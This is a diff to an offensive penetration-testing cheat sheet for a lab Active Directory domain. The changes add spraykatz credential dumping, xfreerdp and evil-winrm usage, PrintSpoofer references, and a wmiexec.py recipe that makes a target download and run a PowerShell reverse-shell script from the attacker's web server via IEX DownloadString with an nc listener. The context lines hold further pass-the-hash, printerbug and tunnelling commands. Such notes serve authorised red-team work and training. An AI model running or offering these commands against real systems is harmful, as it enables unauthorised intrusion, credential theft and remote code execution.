@@ -3008,7 +3008,9 @@ PS > .\SharpHound.exe -c SessionLoop -d megacorp.local
 
 * [https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)
 
-Show percentage of collected user sessions ([example](https://www.youtube.com/watch?v=q86VgM2Tafc)):
+Show percentage of collected user sessions:
+
+* [https://youtu.be/q86VgM2Tafc](https://youtu.be/q86VgM2Tafc)
 
 ```
  # http://localhost:7474/browser/
@@ -3058,6 +3060,16 @@ $ ./printerbug.py megacorp.local/snovvcrash:'Passw0rd!'@DC01.megacorp.local 10.1
 ```
 $ ./scan.py MEGACORP/snovvcrash:'Passw0rd!'@10.10.13.37
 $ ./scan.py -target-file DCs.txt MEGACORP/snovvcrash:'Passw0rd!'
+```
+
+
+
+### spraykatz
+
+* [https://github.com/aas-n/spraykatz](https://github.com/aas-n/spraykatz)
+
+```
+$ ./spraykatz.py -u snovvcrash -p 'Passw0rd!' -t 10.10.13.37,10.10.13.38,10.10.13.39
 ```
 
 
@@ -4276,7 +4288,7 @@ SERVICE_NAME: VulnerableSvc
         BINARY_PATH_NAME   : C:\Program Files\Vulnerable\Vulnerable Service\VulnerableService.exe
         LOAD_ORDER_GROUP   :
         TAG                : 0
-        DISPLAY_NAME       : IperiusRemote Service
+        DISPLAY_NAME       : Vulnerable Service
         DEPENDENCIES       :
         SERVICE_START_NAME : LocalSystem
 
@@ -5206,7 +5218,7 @@ bob@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd!'
 * [https://github.com/NotMedic/rdp-tunnel](https://github.com/NotMedic/rdp-tunnel)
 
 ```
-$ xfreerdp /u:snovvcrash /p:'Passw0rd!' /d:megacorp.local /v:PC01.megacorp.local /dynamic-resolution /drive:www,/home/snovvcrash/www +clipboard /rdp2tcp:/home/snovvcrash/tools/rdp-tunnel/rdp2tcp
+$ xfreerdp /u:snovvcrash /p:'Passw0rd!' [/d:megacorp.local] /v:PC01.megacorp.local /dynamic-resolution /drive:www,/home/snovvcrash/www +clipboard /rdp2tcp:/home/snovvcrash/tools/rdp-tunnel/rdp2tcp
 ```
 
 Reverse local port 9002 (on Victim) to local port 9001 on Attacker (good for reverse shells):
@@ -5229,6 +5241,10 @@ Reverse tunnel web access via SOCKS proxy:
 $ python rdp2tcp.py add socks5 127.0.0.1 1080
 $ python rdp2tcp.py add reverse 127.0.0.1 1080 127.0.0.1 9003
 ```
+
+Other `xfreerdp` tips:
+
+* Disable NLA with `-sec-nla` switch if user's password is expired.
 
 
 
@@ -5291,6 +5307,8 @@ Cmd > .\j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c 
 ### PrintSpoofer
 
 * [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
+* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
+* [https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1)
 
 
 
@@ -5656,8 +5674,8 @@ $ gem install evil-winrm
 Run:
 
 ```
-$ evil-winrm -u snovvcrash -p 'Passw0rd!' -i 10.10.13.37 -s `pwd` -e `pwd`
-$ evil-winrm -u snovvcrash -H FC525C9683E8FE067095BA2DDC971889 -i 10.10.13.37 -s `pwd` -e `pwd`
+$ evil-winrm -u '[MEGACORP\]snovvcrash' -p 'Passw0rd!' -i 10.10.13.37 -s `pwd` -e `pwd`
+$ evil-winrm -u '[MEGACORP\]snovvcrash' -H FC525C9683E8FE067095BA2DDC971889 -i 10.10.13.37 -s `pwd` -e `pwd`
 ```
 
 
@@ -5706,8 +5724,16 @@ PS > Invoke-WmiMethod -Credential $cred -ComputerName PC01 win32_process -Name C
 ### wmiexec.py
 
 ```
-$ wmiexec.py snovvcrash:'Passw0rd!'@127.0.0.1 [-codec cp866]
+$ wmiexec.py snovvcrash:'Passw0rd!'@127.0.0.1
 $ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
+```
+
+Get a PowerShell reverse-shell:
+
+```
+$ sudo python3 -m http.server 80
+$ sudo rlwrap nc -lvnp 443
+$ wmiexec.py -codec cp866 snovvcrash:'Passw0rd!'@10.10.13.38 "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.13.37/rev.ps1')"
 ```
 
 
